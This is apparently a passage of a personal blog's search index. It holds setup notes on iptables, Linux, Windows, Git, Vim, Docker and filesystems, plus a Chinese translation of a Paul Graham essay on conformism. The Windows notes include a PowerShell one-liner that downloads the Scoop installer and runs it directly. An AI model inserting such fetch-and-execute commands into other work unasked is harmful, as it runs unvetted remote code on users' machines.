组成，而 Chain 由一些 Rule 串起来组成， 所以称之为”链“。\nRule 就是对于请求一个断言，如果请求满足断言就执行指定的操作（官方文档中称这个操作为目标，Target），举个例子，”如果请求来自 192.168.19.123，就将其拒绝“，这就是一个 Rule，而”拒绝“就是一个目标，常见的目标有接受，拒绝，转发，调用另一个 Chain 等等。\n请求会在 Chain 中自上而下遍历，直到遇到一个匹配的 Rule，然后调用它的目标。\n四表五链 iptables 中 Table 的数目是规定死的四个：\n filter: 过滤功能 nat: 端口映射，地址映射等 mangle: 用于对特定数据包的修改 raw: 优先级最高的 Table  还有五个预定义的 Chain：\n  PREROUTING: 数据包进入路由表之前\n  INPUT: 通过路由表后目的地为本机\n  FORWARD: 通过路由表后，目的地不为本机\n  OUTPUT: 由本机产生，向外转发\n  POSTROUTIONG: 发送到网卡接口之前。如下图：\n   路由决策是指判断数据包的目的地是否是本机，如果是则进入 INPUT Chain，否则进入 FORWARD Chain\n  PREROUTING ，POSTROUTIONG 和 FORWARD 只有作为路由器使用时才会被调用，正常电脑就只会经过 INPUT 和 OUTPUT\n 每个 Table 都含有几个预定义 Chain，优先级从高到低：raw \u0026gt; mangle \u0026gt; nat \u0026gt; filter\n将内置的所有 Chain 串起来看就如下图：\n目标 比如下面的命令：\niptables -A INPUT -p tcp --dport 80 -j ACCEPT 表示如果发现目标端口是 80 的 tcp 流量就放行，其中 -p tcp \u0026ndash;dport 80 就是条件，而 ACCEPT 就称作目标（Target）了。\n-A INPUT 表示将这条 Rule 追加到（Append）INPUT Chain 的最后面，这里没有指定 Table，默认就是 filter，也可以通过 -t 指定 Table。\n常见的目标有：\n ACCEPT:接收数据包 DROP:丢弃数据包 REJECT:丢弃数据包并且返回一个拒绝 REDIRECT:将数据包重定向到另一个端口  匹配条件除了上面两个，还有一些常用的：\n -s 匹配来源 ip \u0026ndash;sport 匹配来源端口 -m state 状态匹配，表示匹配数据包的状态，比如 -m state \u0026ndash;state ESTABLISHED 就表示匹配已经建立了连接的数据包  RDP HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\nPortNumber then restart\n(官方文档只列出第二处)\nAria2 Aria2常见问题\nLinux Power 合盖的不同设定：\n poweroff 和 halt 均是关机（具体实现有区别） hybernate 是休眠，设备断电（同关机状态），内容保存在硬盘中 hybrid-sleep 是混合睡眠，设备通电，内容保存在硬盘和内存中 supspend (或 sleep)是挂起（睡眠），设备通电，内容保存在内存中 lock 是锁屏 kexec 是从当前正在运行的内核直接引导到一个新内核（多用于升级了内核的情况下） ignore 是忽略该动作，即不进行任何电源事件响应  BOOT uncomment GRUB_DISABLE_OS_PROBER=false in /etc/default/grub\nREISUB  Add GRUB_CMDLINE_LINUX_DEFAULT the sysrq_always_enabled=1 variable in /etc/default/grub OR Execute echo kernel.sysrq=1 | sudo tee --append /etc/sysctl.d/99-sysctl.conf AND Execute sudo update-grub or sudo grub-mkconfig -o /boot/grub/grub.cfg  Laptop: Fn+Alt+PrtSc\nOnce you’ve located your SysRq key, please keep the Alt key pressed.\nPackage Manager pacman speed up : XferCommand = /usr/bin/aria2c -x 8 -s 8 --dir $(dirname %o) -o $(basename %o) %u\n-S -U -Q -R\npacman -Qoq /usr/lib/python3.9\nyay Arch 不可直接 pacman 装，clone yay-bin from AUR, makepkg -si\nTerminal Zsh move to zinit\n[[ -f ~/.private.zsh ]] \u0026amp;\u0026amp;s source ~/.private.zsh\nKonsole \u0026lt;c-(\u0026gt; \u0026lt;c-)\u0026gt; split\nYakuake New Session \u0026lt;c-s-T\u0026gt;\nClose Session \u0026lt;c-s-W\u0026gt;\nNext Session \u0026lt;s-Right\u0026gt; ('')\nTmux set -g mouse on setw -g mode-keys vi  KDE Add Panel to the top, Global Menu added by default\nInstall widget Active Window Control to hide title bar for maximized windows\nInstall latte-dock to imitate OS X. Finally I chose to add widget Icons-Only Task Manager to the left of the panel.\nbalooctl disable\nSettings -\u0026gt; Window Behavior -\u0026gt; Window Actions -\u0026gt; Inner Window 左手按键右手鼠标轻松操纵窗口\nFcitx5 \u0026lt;c-7\u0026gt; to remove word from history\n\u0026lt;c-;\u0026gt; to show clipboard by default, having been reset to \u0026lt;c-'\u0026gt;\nUNICODE: Ctrl+Alt+Shift+U\nScripts insert \\ at each EOL: sed -i 's/$/ \\\\/ FILENAME'\ninsert text at the beginning: sed -i '1i text' FILENAME\nWindows 快速配置 手装：\n Git VS Code VS Firefox Windows Terminal, WinGet 保证最新版  Set-ExecutionPolicy RemoteSigned -scope CurrentUser Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://get.scoop.sh') scoop bucket add extras versions java retools scoop install sudo dismplusplus  编辑 .ssh/config\nWin7 only support Python3.8, does not support Docker\nKB3063858 if fail to install Python\nDevelopment Git 使用 ssh 代替 https进行 git 远程操作可以省去每次输入帐号的重复步骤，尽管一开始的密钥配置会略显繁琐。\nssh-keygen -t rsa -C \u0026quot;Whatever\u0026quot; #输入文件名，按两次回车 #ssh-agent -s 无效，则用下面这条 eval $(ssh-agent -s) ssh-add ~/.ssh/id_rsa  Git配置多个SSH Key\n多SSH管理技巧与Git多账户登录\nundo the first commit: git update-ref -d HEAD\nclone from computers: git clone ssh://hostname/path/to/git\n工作生活两不误之 includeIf 语法：\n[includeIf \u0026quot;gitdir:/path/to/repo\u0026quot;] path = /path/to/.gitconfig-oss [includeIf \u0026quot;gitdir:C:/work/\u0026quot;] path = /path/to/.gitconfig-work  Win 上 Git 问题总结：\n Load key invalid format: [https://stackoverflow.com/questions/41563973/git-clone-key-load-public-invalid-format-permission-denied-publickey]  Vim fail to install YCM\nquick comment  \u0026lt;c-V\u0026gt; to enter visual block mode move around to select lines to comment press \u0026lt;s-I\u0026gt; and insert # or // \u0026lt;Esc\u0026gt; then see changes  clipboard inconsistency vim does not support Xorg, missing the +clipboard support. replace it with gvim\nuse \u0026quot;+y to copy to the system clipboard\nto change the default behavior set clipboard=unnamedplus\nresize window \u0026lt;c-W\u0026gt; -/+上下 \u0026lt;\u0026gt;左右\nencode enc,fenc,fencs,tenc\n  enc (encoding) 内部使用的编码\n如buffer，寄存器中的字符串。在Vim打开文本后，如果它的编码方式与它的内部编码不一致，Vim会先把编码转换成内部编码，如果它用的编码中含有没法转换为内部编码的字符，那么这些字符就会丢失掉。默认值是系统的locale来决定。\n  fenc( fileencoding) 文件自身的编码\n从磁盘读文件时，Vim会对文件编码检查，如果文件的编码与Vim内部编码（enc）不同，Vim就会对文本做编码转换，将fenc设置为文件的编码。Vim写文件到磁盘时，如果enc与fenc不一样，Vim就做编码转换，转换成编码fenc保存文件。\n  fencs( fileencodings ) 字符编码的列表\n编码的自动识别就是通过设置fencs实现的。当打开一个文件时，Vim会按照fencs中编码的顺序进行解码操作，如果匹配成功就用该编码来进行解码，并把这种编码设为fenc的值。这里的匹配成功指的是Vim能正确解码，不会出错，但是不保证没有乱码，所以fencs编码列表的顺序设置很关键。latin1是iso8859-1，属于国际化的标准编码，能表示任何字符，所以放到最后\n  tenc( termencoding) 终端使用文本编码，或者说是Vim用于屏幕显示时的编码，显示的时候Vim会把内部编码转换为屏幕编码再输出，也就是说我们从屏幕上看到的字符都是tenc编码的字符，如果为空，默认就是enc。windows平台Gvim会忽略掉tenc。一般就是从一个终端远程登陆到linux系统时候tenc会起作用。\n  VSCode Window: Title Bar Style choose custom\nShortcuts \u0026lt;c-B\u0026gt; toggle side bar\n\u0026lt;c-J\u0026gt; toggle panel\n\u0026lt;c-`\u0026gt;toggle integrated terminal\n\u0026lt;c-K\u0026gt; leader key\n \u0026lt;c-O\u0026gt; Open Folder \u0026lt;c-S\u0026gt; Keyboard Shortcut  vscodevim set a shortcut to \u0026ldquo;Vim: Toggle Vim Mode\u0026rdquo;\n press \u0026lt;c-K\u0026gt;\u0026lt;c-S\u0026gt;, search for it bind it to Ctrl+' (the default shortcut of fcitx5 clipboard is Ctrl+;)  press gcc to comment\nfiles.exclude   Go to File -\u0026gt; Preferences -\u0026gt; Settings (or on Mac Code -\u0026gt; Preferences -\u0026gt; Settings)\n  Pick the workspace settings tab\n  Add this code to the settings.json file displayed on the right side:\n// Place your settings in this file to overwrite default and user settings. { \u0026quot;settings\u0026quot;: { \u0026quot;files.exclude\u0026quot;: { \u0026quot;**/.git\u0026quot;: true, // this is a default value \u0026quot;**/.DS_Store\u0026quot;: true, // this is a default value \u0026quot;**/node_modules\u0026quot;: true, // this excludes all folders // named \u0026quot;node_modules\u0026quot; from // the explore tree // alternative version \u0026quot;node_modules\u0026quot;: true // this excludes the folder // only from the root of // your workspace } } }    large workspace cat /proc/sys/fs/inotify/max_user_watches echo fs.inotify.max_user_watches=524288 \u0026gt;\u0026gt; /etc/sysctl.conf  For Arch:\nls /etc/sysctl.d/*-max_user_watches.conf  echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.d/50-max_user_watches.conf \u0026amp;\u0026amp; sudo sysctl --system  cat /proc/sys/fs/inotify/max_user_watches  CodeBlocks Missing api-ms-win-crt-*.dll\nInstall VC++ 2015 Redistributable\nFail on Windows Server 2012\nSQL mysql -u {user} -p  ENTER\npostgres \\i 'path/name.sql' to load SQL script\n\\! \u0026lt;command\u0026gt; to run shell command\nshould disable CoW with chattr +C /var/lib/postgres on btrfs\nVirtualize boot VM from physical windows partition，即利用 VBoxManage 从（整个）物理磁盘创建 vmdk，注意 UEFI 启动。VMWare 会自动识别 vmdk 实际指向物理设备而报错，直接从物理磁盘创建即可。注意不要作死启动宿主机系统自身！\nDocker sudo groupadd docker sudo usermod -aG docker $USER docker-compose on PM may be too old, use pip to install, then add $HOME/.local/bin to PATH\nDockerfile best practices\ndocker image/container prune [--filter=]\ndocker container rm $(docker ps -aq -f \u0026quot;since=删掉这个名字对应容器之后创建的所有容器\u0026quot;)\n容器有网络相关错误可能是net.ipv4.ip_forward=0 临时解决 run --network=host\nK8S 一切皆 yaml\n注意 --namespace\n一般不直接 ssh node\nkubectl port-forward pod-name LocalPort:RemotePort\nlibvirt https://ostechnix.com/solved-cannot-access-storage-file-permission-denied-error-in-kvm-libvirt/\nHardware Wireless lspci, rfkill see if blocked\n蓝牙耳机可配对但无法连接： 安装 pulseaudio-bluetooth(怎么 PA15 还不支持高级编码) pulseaudio-modules-bt(https://aur.archlinux.org/packages/pulseaudio-modules-bt/) 再重启 pulseaudio，或者直接上 pipewire\nhowdy https://wszqkzqk.github.io/2021/08/17/%E5%9C%A8Manjaro%E4%B8%8B%E9%85%8D%E7%BD%AE%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/\n找摄像头路径，sudo howdy config 该配置\n由于 kwallet 原因对 sddm 用处不大\nkde, login, system-local-login 以在锁屏启用，必加 try_first_pass\nsu, sudo 不加 try_first_pass，因为在终端中可 C-c。单独 su 需要在 /usr/lib/security/howdy/models 下ln -s user.dat root.dat\nlinux-enable-ir-emitter 开红外，重启后失效的解决方法\nFile System BtrFS 中文博客：https://qsdrqs.site/2021/01/ext4_to_btrfs/ 大概可从 ext4 无损转换，但 grub 等引导项配置需要避坑\n 改 fstab 中的 UUID 和 type 转换根目录，需要 mkinitcpio -P grub-intall 和 grub-mkconfig  新装也需注意，只划整个分区不创子卷意义不大，安装时没注意也可以弥补，只需 chroot 环境下挂载分区，于根目录创建 @name 子卷，再把原来位置的内容移进去，最后分区目录结构如下\n/dev/nvme0n1p4 ├── @ ├── @cache # /var/cache ├── @home ├── @log # /var/log ├── @opt ├── timeshift-btrfs └── @tmp # /var/tmp  snapper 快照\nLVM pvs, pvcreate /dev/\u0026lt;foo\u0026gt;\nvgs vgextend VG PV\nlvs lvresize -l 100%FREE VG/LV\nresize2fs VG/LV  别忘了文件系统扩容\nNTFS sudo mount -t ntfs-3g /dev/nvme0n1p4 /path/to/mount\nNFS CentOS 7安装配置NFS CentOS 7 下 yum 安装和配置 NFS\nServer:\n create folder start servers rpcbind nfs-server edit /etc/exports  exportfs -r showmount -e    Client:\n rpcbind mount [IP]:/ /path/to/mount  VHD Ventoy 插件可启动 VHD 中的文件，虚拟机和U盘启动两不误\n最简单的方法，在 VBox 创建磁盘格式为 VHD 的虚拟机再复制即可\nMPICH\nhttps://stackoverflow.com/questions/14769599/mpi-error-loading-shared-libraries\n總結 用心记,放心阅,方便查\nManjaro踩坑记\nafter remove /bin\ndelete file without rm shred -u unlink\n问题记录 Ubuntu 16.04 to 18.04 断网 能 ping 固定 IP 但 ping 不通域名\nedit /etc/systemd/resolved.conf, let DNS=8.8.8.8\nsystemctl restart systemd-resolved\nDO NOT EDIT /etc/resolv.conf with 127.0.0.53 as a **stub resolver **!\nKDE 桌面崩溃 kquitapp5 plasmashell kstart5 plasmashell killall ksmserver  触摸板突然失灵 sudo modprobe -r i2c_hid # 先卸载模块,或psmouse sudo modprobe i2c_hid # 再装上模块 sudo systemctl daemon-reload #非必须 sytemctl suspend  VMWare报错 先检查是否装对应kernel版本的linux-headers\n每次开机后再输sudo modprobe -a vmw_vmci vmmon\n上述命令亦无效则是kernel版本太新尚无module可用，参见此贴中的步骤，下载该仓库中对应版本执行make即可编译完成\nvmnet8 报错无法联网：sudo systemctl start vmware-networks.service\n基于Qt的软件无法使用fcitx qmake -query查看qt版本及路径等信息\n中文字体选择 常用Web字体\n网页字体测试\nKDE中文字体美化\n","date":"2020-10-28T04:45:41Z","permalink":"https://chinggg.github.io/post/setup/","tags":["环境配置","长期"],"title":"Setup"},{"categories":["随笔"],"contents":"因循的四象限 原文:The Four Quadrants of Conformism\nAuthor : Paul Gramham\nJuly 2020\n给人分类最好的标准之一便是其因循程度和积极性。想象一个平面坐标系，横轴从左到右分别是循规蹈矩的人和独立思考的人，竖轴自底向上是消极温顺的人和积极好斗的人。结果分成四个象限各代表四种人。从左上方开始逆时针旋转，依次是积极守旧型、消极守旧型、消极独立型、积极独立型。\n我认为这四种类型的人在大多数社会都能找到，而一个人被归类入那种象限更多取决于自身的个性而不是社会的流行价值观。[1]\n从儿童中能够找到支持以上两点的绝佳证据。在小学里这四种类型的人都很常见，而学校的规章制度却千篇一律地专制，这无疑表明人能成为何种类型取决于他们自己，而不是由规矩所决定。\n左上方(第二象限)的孩子是积极守旧型，那些向老师告密的红卫兵。他们相信规矩必须被严格遵守，不守规矩的人必须受到惩罚。\n左下方(第三象限)的孩子是消极守旧型，那些温顺如绵羊的老好人。他们小心谨慎、循规蹈矩，但当其他孩子破坏规矩的时候,他们的第一反应是为其可能被罚而担忧，而不是想方设法让他们受罚。\n右上方(第一象限)的孩子是消极独立型，那些心不在焉的游离派。他们对规矩不甚关心，可能连规矩的内容都不太清楚。\n右下方(第四象限)的孩子是积极独立型，那些最淘气的刺头儿。他们看到规矩的第一反应就是质疑之，被吩咐去做某事时，他们往往会和要求对着干。\n当然，在衡量因循程度时，你必须谈及规矩所关系到的对象，而这随着孩子的成长而变化。对于十分幼小的孩子来说，规矩由成人制定。但当孩子长大些，他们的同龄人则成为了规矩的来源。所以一帮少年对学校规则尽可以表示轻蔑，却同样不是独立思考的结果，反而是从众的表现。\n正如我们可以通过叫声分辨鸟的种类，成年人也可以通过言语辨认四种类型的儿童。红卫兵喊叫着“打倒反对派！”，老好人说“邻居们会怎么想？”，游离派声称“各有所好”，刺头儿高呼“但是它的确在动”(原文:Eppur si muove)。\n这四种类型的人并不同样多。消极型的人比积极型的人更多，循规蹈矩者更是远多于独立思考者。所以老好人是最大的一类群体，而刺头儿则最少。\n一个人属于哪种象限更多取决于自身的个性而不是被规矩的类型所限，大多数人就算在完全不同的社会成长仍然会成为和原来属于相同象限的人。\n普利斯顿大学的教授罗伯特·乔治最近写道：\n 我有时侯会问学生：如果他们是生活在废奴前的南方白人，他们在奴隶制上的的立场会是如何？你猜他们怎么说？他们依然会成为废奴主义者！他们依然会勇敢地声讨奴隶制并不遗余力地与之作斗争。\n 教授该是出于礼貌而言止于此，但是学生们在那样的情况下肯定不会坚持成为废奴主义者。实际上，我不惮以最坏的恶意揣测这些学生，他们不仅总体上会表现得和当时的人一样，现在他们之中规矩的积极捍卫者在当时也会是红卫兵式的人物。换句话说，他们不仅不会去反对奴隶制，还会成为奴隶制最坚定的维护者。\n我承认自己怀有偏见，但在我看来那一撮积极守旧型的人对世界上的混乱负有极大的责任，自启蒙运动以来我们演化出的很多措施就是用来保护剩下的人免受侵犯。其中尤为重要的是，“异端”这一概念逐渐淡化，取而代之的是各种不同观点自由辩论的原则，就算有些观点目前还不被认可，尝试践行者也不会受到任何惩罚。[2]\n不过，为什么独立思想者需要被保护呢？因为他们拥有所有的新想法。比如，想当一个成功的科学家，仅仅做到正确是不够的。你必须在其他人都错误的时候保持正确，而循规蹈矩的人是做不到的。类似地，所有成功的创业CEO都不仅拥有主见，还积极伸张。所以社会的繁荣和其拥有限制积极守旧型的措施密切相关，这并非偶然。[3]\n近几年来，我们很多人都注意到那些保护自由探索的措施正在被动摇。有些人说我们是过度反应———因为那些措施并没有被削弱很多，或者是为了更重大的利益让步。我们现在就来处理第二种看法。每当守旧派占上风，他们总是宣称为了更大的利益，只是碰巧每次都是出于一种不同的、不可相容的重大利益。\n至于前一种观点，也就是认为独立思想者敏感过度，自由探索的大门并没有被关得那么严，我想说的是，除非你自己是个有主见的人，否则你无法对此做出判断。除非你自己拥有观念的水位，否则你无法知道它是否正在干涸。而只有独立思想者拥有最先锋的看法，也正因此，他们思想领域探索自由度的变化非常敏感，他们就是煤矿中的金丝雀(译者注:the canaries in this coalmine)。\n守旧者总是宣称他们不想阻塞所有言路，而只是针对坏主意。\n你可能会觉得字里行间其排除异己之心昭然若揭。但我还是要讲清楚为什么我们需要讨论那些“坏主意”，这有两条原因。\n其一，任何决定哪种意见会被禁止的过程都一定会出错。因为没有聪明人想承担这种任务，所以最终这种决定都会由蠢人做出。而当一个过程导致了很多错误，就需要留出误差幅度，也就是减少所禁止的意见数。但积极守旧者很难做到这点，因为他们从小就乐于看到别人受罚，又喜欢互相竞争。正统派的执行者不能容许中间意见的存在，这会给其他执行者以机会在道德纯洁度上占上风，甚至可能会让他们掉转头来攻击自己。所以我们不但不会留出原本所需的误差幅度，反而会出现竞次，最终让所有貌似异端的观点都被禁止。[4]\n其二，观点之间的联系要比看上去紧密得多。如果你限制某些话题的讨论，受到影响的不止是那些话题，限制会传播至任何牵涉到被禁内容的话题，而这并非极端案例。最好的观点往往会在远离起源的领域产生后果。在一个意见会被部分地禁止的世界中拥有想法就像在角落里有雷区的球场上踢足球一样，你会感到球场变了样，不再能踢球如常，就算在安全的地面上也踢得极为压抑。\n过去，独立思想者保护自己的方式是在少数几个地方聚集——最初是在法庭,后来是在大学——在这里他们一定程度上能制定自己的规则。这些可以让人带着想法工作的场所往往拥有保护自由探索的措施，正如晶圆厂拥有强力的空气过滤器，录音棚具有良好的隔音效果。至少在过去几个世纪里，当积极守旧者由于各种原因得以横行霸道的时候，大学是最安全的地方。\n然而不凑巧的是，这一回躲进大学可能不再管用，因为最新一波不宽容的浪潮开始在大学兴起，这股浪潮始于20世纪80年代中期，到2000年似乎已经退去，但就在最近，随着社交媒体的到来，它又死灰复燃了。不幸的是，这似乎是硅谷在自摆乌龙。尽管硅谷的管理者几乎都是独立思想者，但他们给了积极守旧者一个他们做梦都想不到的工具。\n另一方面，也许大学内部自由探究精神的衰退，既是独立思想离开的征兆，也是其原因。50年前本可成为教授的人现在有了其他选择。现在，他们可以成为定量分析师或开创公司。你必须有独立的思想才能在这两方面取得成功。如果这些人成为教授，他们会为了学术自由而进行更严厉的抵抗。因此，也许现在想象独立思想者逃离日渐衰败的大学这一景象会显得过于悲观。大学的衰退，也许正因为很多独立思想者已经离开。\n虽然我花了很多时间思考这种情况，但我无法预测结果如何。会有大学成功扭转当前的趋势，继续保持自己作为独立思想者想要聚集的地方吗？亦或独立思想者会逐渐抛弃大学？我很担心，如果真的走到那一步我们会失去什么。\n但是我对长远的未来抱有希望。独立思考者善于保护自己。如果现存的制度陷入危险，他们会创造新的制度。这需要一定的想象力，但毕竟想象力正是他们的专长。\n作者注：\n[1] 我当然意识到，如果人们的性格在任意两个方面有所不同，你就能以之为坐标轴，把划分出的四个象限称为人格类型。所以我真正要说的是此处这两条轴是正交的，两者有很大的差异\n[2] 积极保守者并不为世界上所有的麻烦负责。麻烦的另一大来源是那种魅力超凡的领导人，他们通过吸引积极保守者而获得权力。当这样的领导人出现时，积极保守型变得更加危险。\n[3] 当我运营Y Combinator时，我从不担心写一些冒犯积极守旧者的东西。如果YC是一家饼干公司，我会面临一个艰难的道德选择。积极守旧者也吃饼干。但他们并没有成功创业。所以，如果我阻止他们申请YC，唯一的影响就是节省我们阅读申请表的工作量。\n[4] 在一个领域已经取得了进步：对谈论被禁思想的惩罚不如过去严厉。被杀的危险很小，至少在较富裕的国家是如此。积极守旧者大多满足于让人被炒鱿鱼。\n[5] 许多教授都有独立的思想，尤其是在数学、硬科学和工程学方面，在这些领域必须靠独立思想取得成功。但学生更能代表普通民众，因此大多是传统思维。所以，当教授和学生之间发生冲突时，这不仅是代际之间的冲突，还是不同类型的人之间的冲突。\n","date":"2020-10-28T00:29:00Z","permalink":"https://chinggg.github.io/post/the-four-quadrants-of-conformism/","tags":["翻译","随笔"],"title":"(译)因循的四象限"},{"categories":null,"contents":"","date":"2020-02-07T17:43:21+08:00","permalink":"https://chinggg.github.io/search/","tags":null,"title":"搜索"},{"categories":null,"contents":"curious but honest, naive but patient.\n ","date":"2018-12-05T13:40:21+08:00","permalink":"https://chinggg.github.io/about/","tags":null,"title":"关于"},{"categories":null,"contents":"友情链接 ","date":null,"permalink":"https://chinggg.github.io/links/","tags":null,"title":"链接"}]